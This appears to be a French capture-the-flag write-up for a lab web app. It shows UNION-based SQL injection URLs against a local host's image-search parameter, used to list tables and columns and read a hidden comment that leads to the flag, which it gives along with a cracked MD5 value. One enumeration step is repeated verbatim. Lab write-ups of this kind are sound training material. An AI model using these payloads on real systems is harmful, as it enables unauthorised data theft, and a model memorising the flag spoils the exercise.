Comme pour la faille member, on va faire des injections SQL:


=>une requête avec information_schema.tables pour énumérer les tables de la base de données active:
http://192.168.1.33/?page=searchimg&id=5%20UNION%20SELECT%201,table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20--%20&Submit=Submit#

ID: 5 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database() --  
Title: Hack me ?
Url : borntosec.ddns.net/images.png

ID: 5 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database() --  
Title: list_images
Url : 1


=>Vous avez ensuite ciblé une table spécifique (list_images) pour découvrir ses colonnes à l'aide de information_schema.columns:

http://192.168.1.33/index.php?page=searchimg&id=5%20UNION%20SELECT%20column_name,%20table_name%20FROM%20information_schema.columns%20--%20&Submit=Submit#

ID: 5 UNION SELECT column_name, table_name FROM information_schema.columns --  
Title: list_images
Url : id

ID: 5 UNION SELECT column_name, table_name FROM information_schema.columns --  
Title: list_images
Url : url

ID: 5 UNION SELECT column_name, table_name FROM information_schema.columns --  
Title: list_images
Url : title

ID: 5 UNION SELECT column_name, table_name FROM information_schema.columns --  
Title: list_images
Url : comment

=>une requête avec information_schema.tables pour énumérer les tables de la base de données active:
http://192.168.1.33/?page=searchimg&id=5%20UNION%20SELECT%201,table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20--%20&Submit=Submit#

ID: 5 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database() --  
Title: Hack me ?
Url : borntosec.ddns.net/images.png

ID: 5 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database() --  
Title: list_images
Url : 1

=>Je veux afficher le contenu de la colonne comment (la seule qui ne s'affiche pas de base)
http://192.168.1.33/?page=searchimg&id=5%20UNION%20SELECT%20id,%20comment%20FROM%20list_images%20WHERE%20id=5%20--%20&Submit=Submit#

ID: 5 UNION SELECT id, comment FROM list_images WHERE id=5 --  
Title: Hack me ?
Url : borntosec.ddns.net/images.png

ID: 5 UNION SELECT id, comment FROM list_images WHERE id=5 --  
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : 5

On decrypte: https://hashes.com/en/decrypt/hash
1928e8083cf461a51303633093573c46:albatroz

On encrypte en sha256
https://www.sha256.fr/
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188